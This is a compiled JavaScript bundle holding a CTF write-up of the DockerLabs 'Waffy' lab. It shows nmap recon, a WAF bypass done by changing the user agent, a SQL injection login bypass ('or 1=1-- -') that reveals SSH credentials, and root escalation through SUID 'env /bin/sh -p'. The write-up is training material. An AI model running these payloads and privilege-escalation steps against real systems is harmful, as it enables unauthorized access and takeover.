"use strict";(self.webpackChunkmy_writeups=self.webpackChunkmy_writeups||[]).push([[3106],{268:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>t,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"DockerLabs/waffy","title":"Waffy","description":"Recon","source":"@site/writeups/DockerLabs/waffy.md","sourceDirName":"DockerLabs","slug":"/DockerLabs/waffy","permalink":"/writeups/DockerLabs/waffy","draft":false,"unlisted":false,"editUrl":"https://github.com/xffsec/xffsec.github.io/tree/main/writeups/DockerLabs/waffy.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialsSidebar","previous":{"title":"\ud83d\udc0b Dockerlabs","permalink":"/writeups/category/-dockerlabs-4"},"next":{"title":"\ud83d\udce6 Hackthebox","permalink":"/writeups/category/-hackthebox-4"}}');var r=s(4848),o=s(8453);const t={},l="Waffy",a={},c=[{value:"Recon",id:"recon",level:2},{value:"Nmap",id:"nmap",level:3},{value:":80",id:"80",level:2},{value:"SQLI",id:"sqli",level:3},{value:"Recon",id:"recon-1",level:4},{value:"Exploit",id:"exploit",level:4},{value:":22",id:"22",level:2},{value:"Access as &quot;baluton&quot;",id:"access-as-baluton",level:3},{value:"Recon",id:"recon-2",level:4},{value:"Exploit - Root",id:"exploit---root",level:4}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",del:"del",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"waffy",children:"Waffy"})}),"\n",(0,r.jsx)(n.h2,{id:"recon",children:"Recon"}),"\n",(0,r.jsx)(n.h3,{id:"nmap",children:"Nmap"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)\n|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)\n80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-title: 403 Forbidden\n|_http-server-header: Apache/2.4.58 (Ubuntu)\nMAC Address: 02:42:AC:11:00:02 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:":80"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"whatweb scan reports a 403 forbidden"}),"\n",(0,r.jsx)(n.li,{children:"replacing the user agent gives information"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' http://172.17.0.2/ | tee -a ww.out\n\nhttp://172.17.0.2/ [200 OK] Apache[2.4.58],\nCookies[PHPSESSID], Country[RESERVED][ZZ], \nHTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)],\nIP[172.17.0.2],\nPasswordField[password],\nTitle[Iniciar Sesi\xf3n]\n"})}),"\n",(0,r.jsx)(n.h3,{id:"sqli",children:"SQLI"}),"\n",(0,r.jsx)(n.h4,{id:"recon-1",children:"Recon"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Apostrophe test -> sql error"}),"\n",(0,r.jsx)(n.li,{children:"MariaDB"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["Request: ",(0,r.jsx)(n.code,{children:"GET /index.php?name=%27&password=PASSWORD123&submit=Login"})]}),"\n",(0,r.jsxs)(n.p,{children:["Response: ",(0,r.jsx)(n.code,{children:"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'PASSWORD123'' at line 1"})]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"points of interest:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"'PASSWORD123'''"}),"\n",(0,r.jsx)(n.li,{children:"the PasswordField is related to the sqli"}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"hypothesis:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"sqli reveals credentials"}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.del,{children:"sqli common parameters are blocked and need a special form on injection"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Request:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"GET /index.php?name=%27%29&password=x&submit=Login HTTP/1.1"})}),"\n",(0,r.jsx)(n.p,{children:"Response:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')' AND passwd = 'x'' at line 1"})}),"\n",(0,r.jsx)(n.h4,{id:"exploit",children:"Exploit"}),"\n",(0,r.jsx)(n.p,{children:"Request:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"GET /index.php?name=%27&password=or+1%3D1--+-&submit=Login"})}),"\n",(0,r.jsx)(n.p,{children:"Response:"}),"\n",(0,r.jsx)(n.p,{children:"/admin.php"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\xa1Bienvenido, balutin! \ud83c\udf89\n\xa1Felicidades! Has logrado hacer un bypass del WAF con \xe9xito.\n\nA continuaci\xf3n tienes los datos de acceso SSH:\n\nUsuario: baluton Contrase\xf1a: balulerobalulon\nRecuerda: \xa1Con gran poder viene gran responsabilidad!\n"})}),"\n",(0,r.jsx)(n.h2,{id:"22",children:":22"}),"\n",(0,r.jsx)(n.h3,{id:"access-as-baluton",children:'Access as "baluton"'}),"\n",(0,r.jsx)(n.h4,{id:"recon-2",children:"Recon"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"suid binaries"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ find / -type f -perm -4000 2>/dev/null\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/env\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"env"}),"+",(0,r.jsx)(n.code,{children:"suid"})," has a privesc exploit method ",(0,r.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/env/#suid",children:"https://gtfobins.github.io/gtfobins/env/#suid"})]}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"exploit---root",children:"Exploit - Root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"baluton@3dd13cac628a:~$ env /bin/sh -p\n# whoami\nroot\n"})})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>l});var i=s(6540);const r={},o=i.createContext(r);function t(e){const n=i.useContext(o);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);